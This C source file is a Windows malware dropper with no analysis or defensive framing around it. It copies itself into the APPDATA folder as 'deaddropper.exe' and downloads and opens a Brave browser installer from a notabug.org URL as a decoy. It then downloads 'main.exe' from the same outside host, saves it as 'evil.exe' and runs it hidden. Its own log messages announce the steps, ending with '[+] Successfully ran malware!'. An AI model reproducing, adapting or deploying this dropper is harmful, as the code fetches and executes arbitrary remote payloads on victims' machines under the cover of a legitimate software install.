#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <urlmon.h>

	
void scooter(LPCTSTR legitimate_app, LPCTSTR legitimate_app_URL, LPCTSTR malware_URL, LPCTSTR malware_app, LPCTSTR dropper_new_name) {
	TCHAR current_dir[MAX_PATH];
	TCHAR current_file[MAX_PATH];
	TCHAR new_dir[MAX_PATH];
	
	GetCurrentDirectory(MAX_PATH, current_dir);
	strcat_s(current_dir, strlen(current_dir)+strlen(legitimate_app)+1, legitimate_app);

	GetModuleFileNameA(NULL, current_file, MAX_PATH);
	GetEnvironmentVariable("APPDATA", new_dir, MAX_PATH);
	strcat_s(new_dir, strlen(new_dir)+strlen(dropper_new_name)+1, dropper_new_name);
	int mresult = MoveFileA(current_file, new_dir);
	if (mresult == 0) {
		printf("[!] Error moving file\n");
	}
	else {
		printf("[+] Successfully moved file\n");
	}
	HRESULT filedl = URLDownloadToFile(NULL, legitimate_app_URL, current_dir, 0, NULL);
	if (filedl == S_OK) {
		HINSTANCE result = ShellExecuteA(NULL, "open", current_dir, NULL, NULL, 0);
	}
	else {
		printf("[!] Error with download\n");
	}

	//download main malware & executing it 
	TCHAR maldir[MAX_PATH];
	GetEnvironmentVariable("APPDATA", maldir, MAX_PATH);
	strcat_s(maldir, strlen(maldir)+strlen(malware_app)+1, malware_app);
	HRESULT maldl = URLDownloadToFile(NULL, malware_URL, maldir, 0, NULL);
	printf("%s\n", maldir);
	if (maldl == S_OK) {
		printf("[+] Successfully downloaded main malware\n");
		HINSTANCE result2 = ShellExecuteA(NULL, "open", maldir, NULL, NULL, 0);
		if (result2 > 32) {
			printf("[+] Successfully ran malware!\n");
		}
		else {
			printf("[!] Error!\n");
		}
		exit(0);
	}
	else {
		printf("[!] Error downloading main malware\n");
	}
}

int main() {
	scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
}
